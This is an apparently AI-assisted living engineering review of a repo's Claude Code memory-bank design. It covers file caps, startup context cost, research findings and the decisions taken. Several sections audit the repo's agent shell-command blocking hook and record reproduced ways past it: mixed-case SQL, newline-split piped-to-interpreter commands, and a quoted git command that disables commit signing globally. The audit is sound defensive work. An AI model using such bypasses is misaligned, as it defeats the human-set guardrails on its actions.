# Memory Bank Paradigm Review — 2026-08-23

**Living document — updated as findings land.** Started 2026-08-23; latest addition
2026-08-25 (cross-shell divergence in the deterministic layer).

**What this is:** a review of how instruction and memory files should be written and maintained,
against current published guidance, and what that invalidates in this repo's design. It records
findings and four decisions. It does not implement anything.

**Why it happened:** `progress.md` reached 388 of its 400-line hard CI cap. The trim that would
have fixed that instance was the fourth archive pass in nine days, with the interval shrinking.
The question stopped being "which lines go" and became "why does this keep happening."

**Companion:** `docs/WORK-MB-PARADIGM-DELTA-BRIEF.md` covers how these conclusions change for a
Work-MB-style deployment, where the audience is non-technical and the goal is enforcement.

---

## The diagnosis

**Growth is automated; shrinkage is manual.** That asymmetry is the whole defect.

- `scripts/pre-compact-check.sh` Check 2 requires a `progress.md` entry dated today before it will
  allow compaction. Every compacting session must append. Nothing in the system ever removes.
- `activeContext.md` had the same shape. `[NS-2]` had decayed to the single line
  "Resolved — see NS-4 and NS-24" and still cost bytes at every session start; it was
  **removed 2026-08-28** under this standard's "issue marked resolved → delete" row. It was one of two
  candidates with zero inbound citations; the other, `[NS-10]`, was kept because its content exists in
  no other file — citation count alone is not the criterion. `[NS-22]` and `[NS-24]` were compressed to
  resolvable stubs in the same pass; `[NS-4]` and `[NS-31]` were examined and left untouched.
  So the general shape holds with one correction: resolved entries mostly persist *as citation
  targets*, not as dead weight, and only the uncited ones can actually leave. Cap allocation and
  enforceability are analysed separately in `docs/MEMORY-BANK-CAP-ALLOCATION-FINDING.md`.
- Removal takes a human-approved contract and a review gate. An archive pass is required for
  `progress.md` relocations but NOT for `activeContext.md` resolved issues, whose row says
  "delete — do not archive" — the `[NS-2]` case above.

A system with its write path wired to a hook and its delete path wired to human attention will
always trend up. No amount of discipline changes the sign.

## Measured state at time of review

Against the ceilings in `.github/workflows/pmb-health.yml`. Worst axis per file.

| File | Lines | Line cap | Bytes | Byte cap | Worst |
|---|---|---|---|---|---|
| `memory-bank/progress.md` | 388 | 400 | 38,453 | 60,000 | **97% — lines** |

> **Footnote, 2026-08-24.** The 400-line figure above is the cap *as measured*, and is retained as a
> dated snapshot rather than updated. It was raised to 600 on 2026-08-24 precisely because of what
> this table shows: the file was at 97% of its line budget while using 64% of its byte budget, so
> the line cap — the metric this review argues is the wrong one — bound first and blocked new
> entries. Editing the number here would erase the evidence for the change.
| `memory-bank/activeContext.md` | 118 | 150 | 33,783 | 45,000 | 75% — bytes |
| `CLAUDE.md` | 188 | (200 advised) | 16,212 | — | 94% of advised |
| `memory-bank/projectbrief.md` | 33 | 120 | 948 | 20,000 | 28% |
| `memory-bank/systemPatterns.md` | 40 | 300 | 1,156 | 40,000 | 13% |
| `memory-bank/techContext.md` | 39 | 300 | 1,152 | 40,000 | 13% |

**Aggregate startup context: 91,704 bytes against a 25,600-byte ceiling — 358%.** Re-read at every
session start and again after every compaction. `CLAUDE.md` alone exceeds the 15 KB warn line for
the entire aggregate.

Two mechanism notes found while measuring:

- The line cap is a **hard CI failure** (`FAIL=1`, `exit $FAIL` in `pmb-health.yml`), but only a
  `[WARN]` in `mb doctor` — `OVER_LIMIT` never reaches an exit code (`scripts/mb.sh:826-832`).
- PMB's own CI allows `activeContext.md` 45,000 bytes; the template it ships to adopters
  (`templates/.github/workflows/memory-bank-size.yml`) allows 40,000. Every other threshold
  matches. The repo publishing the standard holds itself to the looser rule. The CI comment says
  to ratchet this once the file is trimmed; the file has been trimmed.

## Findings

### Native mechanisms now exist for what this repo hand-built

1. **Auto memory** (`~/.claude/projects/<project>/memory/`) is a `MEMORY.md` index loaded every
   session, capped at 200 lines / 25 KB, with topic files loaded **on demand**. Crucially, Claude
   Code measures the index after every write, instructs shortening when near the cap, and returns
   an error when over. **Shrinkage fires on the same trigger as growth** — the exact symmetry this
   repo lacks.
2. **`.claude/rules/*.md` with `paths:` frontmatter** load only when Claude touches matching files.
   This is the real progressive-disclosure lever. This repo uses none of it, while holding eight
   `standards/` documents in exactly that shape, enforced by prose rather than mechanism.
3. **Skills** load only `name` and `description` at startup; the body loads when judged relevant.
   The documented boundary: "If an entry is a multi-step procedure or only matters for one part of
   the codebase, move it to a skill or a path-scoped rule instead." The 7-phase workflow, Handoff
   Protocol, and Task Contract Protocol are procedures held resident.
4. **`/doctor` already proposes CLAUDE.md trims** (v2.1.206+), cutting what is derivable from the
   codebase and keeping pitfalls, rationale, and conventions.
5. **Block-level HTML comments are stripped before injection.** Long "WHY" annotations in
   `CLAUDE.md` could sit in `<!-- -->` at zero token cost. Applies to CLAUDE.md only.

### `@path` imports do not reduce context

"Imported files are expanded and loaded into context at launch." And explicitly: "Splitting into
`@path` imports helps organization but doesn't reduce context." An earlier proposal in this review
to split `CLAUDE.md` into `docs/` files pulled back by reference **would have saved zero bytes**
while improving the per-file metric — the same defect as the 2026-08-19 reflow that cut 158 lines
to 134 with byte-identical content.

### Structure has no measured effect on adherence; size still costs

McMillan, arXiv 2605.10039 (11 May 2026), 1,650 sessions / 16,050 observations, found no detectable
contrast on file length, rule position, file architecture, or deliberate self-contradiction.

**Read it carefully.** It is a single-author preprint, not peer reviewed, reporting a *null* result
after multiple-testing correction. Bayes factors of 0.05–0.10 support the null for **size and
contradiction only**; position and architecture had no Bayes support and are inconclusive. The
5.6%-per-step within-session compliance decay is **post-hoc and non-monotonic**.

Conclusion: do not restructure `CLAUDE.md` hoping for better obedience. Trim it for **cost**, which
is a separate and better-supported argument — see below. Keep the two motives apart.

### Long context degrades output, measured across 18 models

Chroma (Hong, Troynikov, Huber, July 2025) tested 18 models across four providers. Performance
degrades non-uniformly with input length on all of them. The directly analogous result is
LongMemEval: a focused ~300-token prompt versus a full 113k-token prompt containing irrelevant
context produces consistent decline. Claude Opus 4 showed the most pronounced gap. Counterintuitively,
shuffled haystacks outperformed coherent ones across all 18 models. The authors note their tasks are
simpler than real-world use, so actual degradation may be more severe.

**This is the load-bearing justification for reducing startup size** — not adherence. 91 KB of
mostly task-irrelevant text sits in front of every task and degrades it.

Caveat: July 2025, Claude 4-era models.

### Repeated condensation is a named failure mode

ACE (Zhang, Hu, Upasani et al., Stanford / SambaNova / UC Berkeley, arXiv 2510.04618, **ICLR 2026**)
names two failures in iteratively maintained context:

- **Context collapse** — iterative rewriting erodes detail over time.
- **Brevity bias** — "drops domain insights for concise summaries." **This is the one that indicts
  this repo directly**: archive passes condense *for brevity*, and six `progress.md` sections carry
  the marker "condensed, full detail archived," some condensed more than once.

Its remedy is structural: incremental **delta updates** replacing monolithic rewrites, plus
grow-and-refine with deterministic merge, de-duplication, and pruning. Reported gains: +10.6% on
agent benchmarks, +8.6% on finance, matching a top production AppWorld agent with smaller models.

### The enforcement ladder has optional rungs

Not every adopter has ACR; `/ai-review` is machine-local and unshipped; CI only runs on GitHub.
**Hooks (`core.hooksPath` + `settings.json`) are the only deterministic layer that both ships with
this repo and always runs.** Anything load-bearing must survive with semantic review and CI absent.

This is corroborated by official guidance: "To block an action regardless of what Claude decides,
use a PreToolUse hook instead," and "CLAUDE.md instructions shape Claude's behavior but are not a
hard enforcement layer." The layered model in `CLAUDE.md` does not need revisiting — only its
assumption that every rung is present.

### Three independent systems converge on the same tiering, and this repo already runs it

Surveyed 2026-08-24 after the decisions below were taken. Two external context systems were examined
at README level; neither was installed, and no source was read.

- **OpenViking** (`volcengine/OpenViking`) loads context in three tiers — an ~100-token abstract for
  relevance filtering, an ~2k-token structural overview for planning, and full content only when
  needed. It reports 34.3–91.0% token reduction from that alone. Its second theme is that retrieval
  must be *observable* — browsable with `ls`/`tree`/`find`, with each query's path preserved —
  because vector stores are "black boxes." That is the same objection this repo used to disqualify
  the native store for being unreviewable in a PR.
- **Lumina** (`Bino5150/lumina`) splits memory into layers that never expire (identity, structural
  reality) and a session layer under temporal decay, with a tunable constant giving roughly 78%
  retention at 30 days. Notably it refuses automatic promotion into the permanent layers: "nothing
  gets promoted to her permanent identity or critical-fact layers automatically. Ever."

Set against this repo's own `authority` order — immutable > stable > volatile > accumulating — all
three describe the same shape. **This repo already has the tier taxonomy; what it lacks is tiered
loading.** `CLAUDE.md` instructs reading ALL memory-bank files, so every tier arrives at full
detail, which is the ~22,072-token startup figure measured above.

**The sharpest observation is that the pattern is already implemented here, in the wrong store.**
The auto-memory store is an index file carrying one line per memory, with detail in separate files
fetched on demand, and a write-time hook maintaining the index. That is exactly an abstract tier
plus a detail tier. It was applied to the store decision 2 deprioritized, and never to
`memory-bank/`, which is the one paying the startup cost every session. Decision 1 is therefore a
porting problem, not a design problem.

**Neither system is adoptable as software.** `projectbrief.md` is immutable on "no external
dependencies (self-contained Markdown and config files)"; OpenViking is a Rust service with a Python
server, Lumina a PySide6 desktop application. OpenViking's core is additionally **AGPLv3**, which is
disqualifying for code that would ship inside a template copied into other repositories — a distinct
objection from the dependency constraint, and a harder one. Lumina's decay constant is a candidate
answer to decision 3's deterministic prune, but time-decay fits this repo poorly: a two-month-old
`[NS-N]` entry here can still be load-bearing, and age is not the signal that makes it evictable.

### The deterministic layer forks on the shell — and the gate cannot see it

**How this section was written matters to how you should read it.** Its first two drafts contained
nine claims that the review gate found to be false or unfounded. Every one sat in the *interpretive*
layer — instance counts, a family taxonomy, ordinals, and two opposite assertions about whether a
parity check exists. None was in the measured findings. The section has been cut back to what was
verified, with the means of verification stated per claim. The failure that produced those nine
claims turned out to be the more useful finding, and it is recorded below the facts.

#### Verified findings

**1. `mb`'s integrity checksums are not portable across shells.** MEASURED — reproduced in both
directions on unedited files, 2026-08-25.

| | Hash source | Case written | Comparison | Case-sensitive? |
|---|---|---|---|---|
| `mb.sh` | `sha256sum` | lowercase | `[ "$a" != "$b" ]` | **yes** |
| `mb.ps1` | `Get-FileHash` | UPPERCASE | `-ne` | no |

Both `mb doctor` and `mb verify-integrity` rewrite the baseline unconditionally at the end of every
run, in the running shell's case (`doctor`: `mb.sh:1163`, `mb.ps1:1449`; `verify-integrity`:
`mb.sh:1996`, `mb.ps1:2283`). A `doctor` run under pwsh therefore reports correctly and then leaves
a baseline that makes the next bash run flag **every** memory-bank file as "modified outside mb
tools". Because that run refreshes the baseline from current content, **all** subsequent mismatches
are case artifacts — the false-positive rate in the pwsh→bash direction is 100%, and a real external
modification cannot be detected at all. The reverse direction silently passes.

**2. Four of the six sh matcher call sites apply no case normalization.** MEASURED — read
`scripts/dangerous-commands.sh`, 2026-08-25. The sites are `block()` `:293`, `block_boundary()`
`:310`, `confirm()` `:332`, `confirm_regex()` `:349`, `confirm_boundary()` `:396`, `warn()` `:460`.
Only `confirm_regex()` (`grep -i`) and `confirm_boundary()` (`tr 'A-Z' 'a-z'`, `:443-445`)
normalize. The `.ps1` twin is uniformly case-insensitive (`OrdinalIgnoreCase` / `IgnoreCase` at
`:203`, `:263`, `:280`), so the divergence always takes the form of sh being narrower — **across the
BLOCK, CONFIRM and WARN tiers alike**, not only BLOCK as first recorded.

**3. Both BLOCK-tier gaps reproduce by execution.** MEASURED — hook run against constructed
payloads, 2026-08-25. A mixed-case SQL statement receives no verdict on sh and is denied on ps1. A
piped-to-interpreter command split across a newline evades sh entirely; the ps1 twin catches it
because its regex runs under `Singleline`. Both are present on `main` today.

**4. A differential parity harness already exists, and does not run in CI.** MEASURED — read
`tests/test-dangerous-commands.sh:573-633` and `.github/workflows/`, 2026-08-25. `assert_parity`
pipes one payload into both hooks and asserts identical verdicts, across 11 call sites, and its own
comment names an sh/ps1 case divergence as the precedent it exists for. **But** it covers 1 of the
12 `.sh`/`.ps1` twin pairs in `scripts/`, asserts only the CONFIRM tier, and skips silently when
`pwsh` is absent unless `PMB_REQUIRE_PARITY=1` — which nothing in `.github/workflows/` or
`tests/run.sh` sets. On Linux CI it therefore never executes. That is a sufficient explanation for
why finding 2 survived: the mechanism that would have caught it was present, narrow, and dormant.

The actionable item is not "build a parity test". It is **widen the harness that exists to the other
11 pairs and to the BLOCK and WARN tiers, and make CI set `PMB_REQUIRE_PARITY=1` so a skip cannot be
mistaken for a pass.**

#### The finding underneath: the gate validates diffs, never premises

The review gate binds a SHA-256 of the diff (`scripts/review-reminders.sh`). It is therefore
structurally unable to see that a line the diff did not touch is false, or that a line it did touch
was derived from a false one. Premises are invisible to the only layer that always runs.

The evidence that this is load-bearing rather than theoretical: the claim *"seven pairs stay
byte-identical"* was written into the task contract governing this branch and **survived nine review
rounds, six domains, and an Opposition pass.** It was wrong throughout — eight pairs are in scope and
one, `standards/MEMORY-BANK.md`, had been divergent since 2026-06-18. No reviewer was careless; the
claim was a premise, and nothing verifies premises.

The record itself supplies no signal to compensate. MEASURED, 2026-08-25:

- **The provenance frontmatter is inert.** All five `memory-bank/` files carry identical values —
  `source_type: canonical`, `confidence: high`, `lineage: []`. A field whose value never varies
  cannot distinguish a claim verified by execution from one written from a hunch. The schema shipped;
  the discipline did not.
- **Most claims are unsourced.** `activeContext.md`: 13 of 54 entries cite a file:line or SHA (24%).
  `progress.md`: 15 of 107 (14%).
- **This document has the missing mechanism and `memory-bank/` does not.** The verification ledger
  below classifies every claim MEASURED / PRIMARY / SECONDARY. Nothing equivalent exists in the files
  that are loaded into every session as premise.

`confidence: high` sitting on a file where roughly 80% of claims are unsourced is not neutral — it
launders guesses as verified. A field that always reads "high" is worse than no field at all.

**This qualifies decision 3.** Entry lifecycle and deterministic prune are necessary but not
sufficient: entries carry no verification status, so neither a prune nor the next session can tell a
measured fact from a guess. Provenance has to vary per claim before lifecycle rules can act on it.

**Not fixed.** `mb.{sh,ps1}` and `dangerous-commands.{sh,ps1}` are outside the in-flight branch's
contract. Operator-facing caveat in `docs/COMMANDS-REFERENCE.md`; tracked as `[NS-36]` (checksums),
`[NS-37]` / `[NS-38]` (the two BLOCK-tier gaps), and `[NS-39]` (the premise-verification gap).

### Policy split across a per-user global file and a per-project file, with no arbitration

**FOUND AND FIXED 2026-08-25 — the specific contradiction is closed; the structural gap is not.**
`~/.claude/CLAUDE.md` now defers to the setting by name instead of hardcoding a value, and `mb
doctor`'s check was rewritten to compare the value rather than test for the variable's name (both
shells, mutation-proved). What remains open: **nothing states which file wins**, and the global file
is still per-user and outside every repository, so the next contradiction has the same clear run.
The record below is what was measured before the fix.

MEASURED 2026-08-25. Rules live in two places: `~/.claude/CLAUDE.md` (per machine, outside every
repo) and the project `CLAUDE.md` (committed). The relationship between them is asserted in one
direction only and resolved in neither.

- The global file states *"Project-level CLAUDE.md files add to these — they do not replace them."*
- The project file defines an authority order for its `memory-bank/` files and **never mentions the
  global file**. There is no rule for a direct contradiction.

There is a live contradiction. `.claude/settings.json` sets `CLAUDE_AUTOCOMPACT_PCT_OVERRIDE` to
**65**; the global file hardcodes **"50%"**; the project file defers to the setting by name and is
correct. Under the global file's own precedence rule, **the stale constant outranks the correct
deferral** — the advisory layer overriding the deterministic one, inverting the layering order this
repo otherwise enforces. This is the same inversion recorded against `mb doctor`'s 400-line cap.

The detector is blind to it. `mb.sh:859-869` / `mb.ps1` check "Token Budget drift" and, run against
this contradiction, report `[OK] Token Budget section current`. The check tests only whether the
string `CLAUDE_AUTOCOMPACT_PCT_OVERRIDE` appears in both files; it never compares values. A presence
check reported as a correctness check — the same shape as the round-7 finding that coverage failures
wear correctness clothing.

The two files also duplicate each other: 4,855 B global + 16,212 B project load every session before
`memory-bank/` is read, 1,976 B of it byte-identical, with *Karpathy Coding Principles* and *Token
Budget* present in full in both.

**The general fix was not a better drift check** — though the check was fixed too, and now warns on
any instruction file whose stated threshold disagrees with `settings.json`. The defect underneath is
prose restating machine state; every restatement is a drift bug that has not fired yet, and
detecting drift after the fact is strictly worse than making it impossible. The rule that removes
the class, and the one actually applied to the global file: **a document names a setting and never
copies its value.** Applied here it also removes the duplication, because the duplicated
sections are exactly the ones carrying restated constants. **Not yet tracked in `activeContext.md` — that file is at its cap and could not accept the entry (see `[NS-39]`).** The Work-MB delta
is in `docs/WORK-MB-PARADIGM-DELTA-BRIEF.md`.

## Decisions taken 2026-08-23

1. **Amend `projectbrief.md`.** "Memory Bank files are read at session start" becomes a goal
   statement: *"Memory Bank state is available at session start: an index is loaded; detail is
   fetched on demand."* User approved amending the `immutable` tier. Accompanying meta-rule:
   **immutable-tier entries state goals, never mechanisms** — the old wording froze a 2024
   implementation and then blocked its own replacement.
2. **Keep the portable store; steal the enforcement loop.** Native auto memory is disqualified as
   the store — machine-local, unreviewable in a PR, Claude Code only, and `projectbrief.md` requires
   Cursor support. Its write-time index measurement transfers, built as a hook.
3. **Adopt ACE's principles, not its architecture.** Take entry lifecycle and deterministic
   merge/prune; reject the three-agent design as overkill for markdown. `[NS-N]` entries already
   carry identity; what is missing is a state field and hook-driven eviction of resolved entries.
4. **Land the in-flight commit-signing change first**, so the restructure starts from a clean base.

**Expected effect, estimated not measured:** startup context ~91.7 KB → ~17 KB, about 19 KB
(~4,750 tokens) saved per session start and again per compaction. Decision 1 stops *paying* for the
bloat; decision 3 stops the bloat accumulating. A poor index would erode the gain by forcing
detail fetches anyway — the design has to earn the reduction.

## Verification ledger

Status meanings: **MEASURED** — command run against, or source read in, this repo, on the date given in
the row (2026-08-23 unless stated). **PRIMARY** — read
from the source document. **SECONDARY** — from a summary of a source not opened. Treat SECONDARY as
unconfirmed.

| Claim | Origin | Status |
|---|---|---|
| File sizes, caps, and the 358% aggregate | `wc -l` / `wc -c` | MEASURED |
| Line cap is hard CI failure, WARN-only in `mb doctor` | read `pmb-health.yml`, `mb.sh:826-832` | MEASURED |
| PMB CI 45,000 B vs shipped template 40,000 B | read both workflows | MEASURED |
| Test suite 382 passed / 0 failed, 19 suites | `bash tests/run.sh` | MEASURED |
| Imports load at launch, do not reduce context | Claude Code memory docs | PRIMARY |
| `.claude/rules/` `paths:` scoping | Claude Code memory docs | PRIMARY |
| Auto memory index cap + write-time backpressure | Claude Code memory docs | PRIMARY |
| Auto memory is machine-local | Claude Code memory docs | PRIMARY |
| Managed policy CLAUDE.md is non-excludable | Claude Code memory docs | PRIMARY |
| "Target under 200 lines"; HTML comments stripped | Claude Code memory docs | PRIMARY |
| `/doctor` trim proposals, v2.1.206+ | Claude Code memory docs | PRIMARY |
| Hooks-over-prose guidance, verbatim | Claude Code memory docs | PRIMARY |
| Skills: name + description only at startup | Anthropic engineering blog | PRIMARY |
| McMillan: null on 4 variables; preprint, not peer reviewed | arXiv 2605.10039 abstract | PRIMARY |
| Bayes support for size/contradiction only | arXiv 2605.10039 abstract | PRIMARY |
| 5.6%/step decay is post-hoc and non-monotonic | arXiv 2605.10039 abstract | PRIMARY |
| Chroma: 18 models, LongMemEval focused-vs-full decline | Chroma context-rot report | PRIMARY |
| ACE: ICLR 2026, context collapse + brevity bias, +10.6%/+8.6% | arXiv 2510.04618 abstract | PRIMARY |
| McMillan baseline 0/524 → 67.7% | alexdunlop.com summary | SECONDARY |
| McMillan 71.3% new vs 45.1% editing | alexdunlop.com summary | SECONDARY |
| χ² values for the four null variables | alexdunlop.com summary | SECONDARY |
| AGENTS.md at Linux Foundation AAIF; 60,000+ repos | search summaries | SECONDARY |
| OpenViking three-tier loading (~100 / ~2k / full) | OpenViking README | SECONDARY |
| OpenViking 34.3–91.0% token reduction | OpenViking README, vendor benchmark | SECONDARY — unverified vendor claim, no independent replication |
| OpenViking core licensed AGPLv3 | OpenViking repo metadata | SECONDARY |
| Lumina layered memory + ~78% retention at 30 days | Lumina README | SECONDARY — vendor claim, formula not inspected |
| Lumina refuses automatic promotion to permanent layers | Lumina README | SECONDARY |
| SwitchYard is an LLM routing proxy; Stage Router uses observable stage signals | SwitchYard README | SECONDARY — README only, no source read |
| SwitchYard `spinning` / `exploring` signals as escalation triggers | SwitchYard README | SECONDARY — README only; the promotion argument is this repo's, not SwitchYard's |
| SwitchYard corroboration threshold (two signals required to fire) | SwitchYard README | SECONDARY — README only; REJECTED here, see `[NS-35]` |
| This repo's auto-memory store already implements index-plus-detail | Observed in this session's own loaded context | MEASURED |
| sh/ps1 checksum case divergence; 100% false-positive rate pwsh→bash | reproduced both directions, 2026-08-25 | MEASURED |
| `doctor`/`verify-integrity` rewrite the baseline every run | read `mb.sh:1163`, `mb.ps1:1449`, `mb.sh:1996`, `mb.ps1:2283`, 2026-08-25 | MEASURED |
| 4 of 6 sh matcher sites apply no case normalization; ps1 uniformly insensitive | read `dangerous-commands.sh` `:293`-`:460`, `.ps1:203,263,280`, 2026-08-25 | MEASURED |
| `assert_parity` exists (11 cases, 1 of 12 pairs, CONFIRM tier) and never runs in CI | read `tests/test-dangerous-commands.sh:573-633`, `.github/workflows/`, 2026-08-25 | MEASURED |
| memory-bank provenance fields are identical across all 5 files | read frontmatter, 2026-08-25 | MEASURED |
| 24% / 14% of activeContext / progress entries cite a file:line or SHA | counted, 2026-08-25 | MEASURED |
| Global file hardcodes 50 while settings.json sets 65; `mb doctor` reports OK | read both `CLAUDE.md`s + `.claude/settings.json`, ran `mb doctor`, 2026-08-25 | MEASURED |
| `block()` matches case-sensitively while the ps1 twin does not | read `dangerous-commands.sh:293`, `.ps1:203`, 2026-08-25 | MEASURED |
| Round 6's blocker was line-vs-string (`-z`), not case | read `dangerous-commands.sh:374`, 2026-08-25 | MEASURED |

**Withdrawn:** an earlier draft of the 2026-08-25 section stated that no mechanical parity
check exists for the `.sh`/`.ps1` twins, and that behavioural parity has "no check at all".
Both are false: `tests/test-dangerous-commands.sh:573-633` is exactly such a test. The
accurate claim is that it is narrow and dormant in CI — see finding 4. The same draft also
claimed a mechanical `scripts/` vs `templates/scripts/` byte-identity check exists; that one
does not. Two opposite errors about verification infrastructure in consecutive drafts is the
observation that motivated the premise-verification finding above.

**Withdrawn:** an earlier draft of the 2026-08-25 section called the checksum divergence the
*third* instance of case divergence, counting round 6's `confirm_regex` finding as the first. Round
6's blocker was line-vs-string, fixed with `-z` (`dangerous-commands.sh:374`); the `-i` on the same
call is separately justified at `:358` as design-time case parity and was never a round-6 fix. The
corrected tally is 2 case + 3 line-vs-string.

**Withdrawn:** an earlier draft cited "FLenQA accuracy 0.92 → 0.68" attributed to the Chroma
report. That figure is not in the Chroma report; a search summary conflated two papers. Do not use
it. The LongMemEval result above replaces it and is better supported.

> This paragraph previously sat BETWEEN two runs of table rows, which silently terminated the
> Markdown table and rendered the six rows after it as literal text — the rows were present in the
> source but invisible as ledger entries. Keep prose out of the table body; notes go after it.

## Round 10 — the gate pass that landed PR #21 (2026-08-26)

Six independent agents (five lenses plus Opposition) reviewed the 11-file follow-up diff.
Verdict: **Approve with four must-fixes**, all applied before commit. Recorded here because
`memory-bank/progress.md` has ~6 bytes of headroom and cannot hold it.

### Why the verdict was not "Request Changes"

The rewritten check 5 is a **net improvement**, and that reframing downgraded half the findings.
The old check only ever compared *presence* of a variable name, and its one real branch was gated
on a global `~/.claude/CLAUDE.md` that `mb` never creates — so for essentially every adopter it
printed nothing at all, while the bug that actually shipped (a hardcoded 50% against a live 65)
reported `[OK]`. Its remediation string, "copy the Token Budget section from global", is the exact
practice the new code now warns against.

### Must-fixes applied

| # | Fix | Evidence it was needed |
|---|-----|------------------------|
| 1 | `activeContext.md` headroom figure → 599/60,000, **ZERO** bytes | Said "37 bytes"; actual is 0 against a `-gt 60000` CI FAIL. A self-referential figure stale inside its own diff — the defect class `da62ad2` blocked on. |
| 2 | `COMMANDS-REFERENCE.md` row 5 rewritten; `mb upgrade` row now names `.gitignore` | Row 5 documented the *deleted* presence-check and prescribed the practice the new code flags as drift. The file mentioned `.gitignore` **zero** times although upgrade now writes that tracked file. |
| 3 | `mb.ps1` `-notcontains` → `-cnotcontains` | `@('Handoff.md') -notcontains 'handoff.md'` → `False`: pwsh silently skipped an entry bash would add. A **third** instance of the sh/ps1 case family (`[NS-37]`/`[NS-38]`), in code whose own comment says the two must be identical. |
| 4 | Honest `KNOWN LIMITS` block in both shells | The prior comment claimed the `auto-compact` gate had closed the "quality at 90%" false-positive class. It had not — verified, that line still yields 90. |

### The one departure from Opposition

Opposition said leave the matcher untouched and document both defects. That is right for the
**false OK** — closing it needs open-ended phrase matching, and widening is what produced the
false positives in the first place. It is wrong for the **false WARN**, because `at ` → `\bat `
is a *narrowing*: it can only remove matches, so it cannot re-open the 40%-handoff false positive
that motivated the "don't widen" rule. Validated before applying — all three real spellings
(`fires at 40%`, `at approximately 50%`, `at 65%`) still detected; `th(at)`, `form(at)`, `gre(at) N%`
all eliminated. Both shells verified to agree afterwards.

### Deferred, with the reason each is not blocking

- **`standards/` vs `templates/` parity check.** Check 5 does not scan `templates/standards/MEMORY-BANK.md`. In an *adopter* that gap does not exist — `_upgrade_src` copies `templates/standards/*` into `standards/*`, so the scanned file **is** the shipped copy. PMB-source-only. Would also catch the pre-existing `mb compact`/`mb clean` divergence at lines 131/396.
- **`mb.ps1` has zero test coverage** for `Sync-Gitignore` and check 5. The mechanism already exists and is unused: `tests/test-dangerous-commands.sh` has a `command -v pwsh` parity block with `PMB_REQUIRE_PARITY=1` to convert skip→fail. It would have caught must-fix #3.
- **`grep -c … || echo 0`** at `tests/test-mb-upgrade.sh` yields `0
0` (verified) — the construct `tests/test-mb-doctor.sh` documents as a fixed Git Bash bug. Passes only because `assert_contains` matches line-wise. Safe to drop: the file sets `set -u`, not `set -e`.
- **Temp-dir leak.** Four new `trap … EXIT` each replace the prior one; measured **5** dirs leaked per run. *Not* introduced by this diff as first filed — `test-mb-doctor.sh` already carries 29 traps at HEAD. Pre-existing repo-wide convention; fixing it is a suite-wide cleanup.
- **Test-comment overclaims.** "The three below assert the MECHANISM" — only the third is coupled to the implementation, and it greps `mb.sh` source text, so an equivalent refactor breaks it while a behaviour change may not. Also `test-mb-doctor.sh` still credits an implementation this diff deleted.
- **Double `# Memory Bank` header** on a freshly created `.gitignore` (verified, cosmetic).
- **Prose corrections** — five false claims, seven stale `file:line` citations, two dead heading pointers. Deferred by explicit user direction; the agreed fix is to strip line numbers from prose and cite function/heading names. One is worth separating from the rest: `WORK-MB-PARADIGM-DELTA-BRIEF.md` asserts as *verified* a claim this same commit **withdraws as false** — a self-contradiction inside one commit, not a moved line number.

## Rounds 4-9 — relocated verbatim from `memory-bank/progress.md` (2026-08-26)

The five dated sections that follow were moved here **verbatim** for the same reason the Round 10
section states for itself: `memory-bank/progress.md` had **5 bytes** of headroom against a
60,000-byte CI hard-fail, and the budget those files are actually measured against — the 25 KB
aggregate startup context, mirrored in `mb doctor` check 15 — stood at **121 KB, 486% of ceiling**.

Nothing was summarised, reworded, or deleted, and `progress.md` keeps a dated pointer to each.
That distinction is the whole point: the 2026-08-25 archive pass was reverted as unauthorized
precisely because it *removed* content and broke `[NS-35]`'s citation. This is the convention the
Round 10 entry established, applied retroactively to the rounds that predate it.

Why not simply raise the cap: `.github/workflows/pmb-health.yml` defines the byte FAIL as a
downward ratchet — "a FAIL value that is never tightened is a cap in name only" — and measured
growth was **+24,355 bytes in three days**, so a raise buys roughly one day of active work.

The sections below are siblings of this note, not subsections of it; each keeps its original
heading and level.

## 2026-08-25 — Round 9 Completed (all six domains); Separator Hole Closed; Figures Corrected Outward

**Session crossed local midnight — `[NS-34]` exactly as documented; contract re-proposed with byte-identical scope. New dated section on purpose: appending to yesterday's heading is the `493dfa5` error class.**

- ✅ **All six domains ran, plus Opposition** — the first complete review on this branch in nine
  rounds. Maintainability: 0 blocking, 15 documentation findings. Architecture Drift: 1 blocking.
  Performance: 0 blocking. (Security/Correctness/Testing ran 2026-08-24; see the section below.)
- 🔴 **Architecture's blocker was a false completeness claim in `activeContext.md`** — "All nine
  locations now read 600", refuted by running `mb doctor` once: `mb.sh:831` and `mb.ps1:1090` still
  enforce 400, so the tool WARNs that `progress.md` exceeds a limit the shipped docs certify as fine.
  **Second consecutive round that same sentence was found wrong**, and it violates the Failure
  Criterion this branch itself added. Corrected to state the runtime/doc split honestly; the caps
  themselves are out of contract scope and stay tracked, not silently reconciled.
- ✅ **Separator hole CLOSED on user direction** (was recorded as an accepted limit the day before).
  `git -c core.pager='less | head' config --global commit.gpgsign false` was silently allowed;
  `core.pager` with a pipe is ordinary configuration and the command unsigns every repo. Nested gaps
  are now `.{0,300}` — still bounded (they are the quadratic pair) and measured slightly FASTER than
  the class they replaced. The resulting false positive is ASSERTED in both suites rather than
  tolerated. **Judgment recorded: the original "document it" call treated the two commands as equally
  plausible; they are not, and fail-closed was the right direction.**
- 📌 **The recurring failure mutated: corrections stopped propagating OUTWARD.** Every measured figure
  inside the script now reproduces (verified independently: 17.86s / 9.38s / 0.465s / ~1.0s flat sh /
  0.75s bounded / 4.3s unbounded / 46.8s mutant). But the falsified 1.6s figure had migrated into
  `standards/SECURITY-GUARDRAILS.md` — which ships to adopters via the byte-identical mirror — and
  the "byte-counting `${#cmd}`" premise this branch spent a round disproving survived verbatim in
  `CHANGELOG.md`. Corrected: 1.6s→4.3s, 490→296 (`-C` path; 295 was itself off by one — the gap must
  hold `-C `, the `/` and a trailing space, so path+4≤300), `${#cmd}`→`wc -c`, Pester margin 20x→9x,
  and a "Verified" UTF-16 claim that a single probe disproved. **The sweep was script-scoped when it
  needed to be doc-scoped.**
- 📌 **A performance claim of mine was wrong and is corrected here.** I reported "+82% on every Bash
  tool call". Measured properly, the `.ps1` path — which runs first wherever pwsh exists — shows
  **zero** regression (423.8ms → 423.3ms). The +92% lands only on the `.sh` fallback (562→1081ms),
  i.e. CI and non-pwsh hosts, and is fully accounted for by subprocess count (5→19 spawns at ~34ms
  each on Windows). On Linux the same spawn delta is likely tens of ms. I had measured one path and
  generalised.
- 📌 **Two available wins measured but NOT applied**, per the round's rule that only a live bypass
  earns code: .NET `NonBacktracking` collapses the 17.86s worst case to **2ms** with byte-identical
  results on all six patterns (and would make both shells DFA-based, obsoleting the `{0,300}` bounds);
  and merging the four `confirm_regex` greps plus a git-token pre-gate takes the sh path 1081→~770ms,
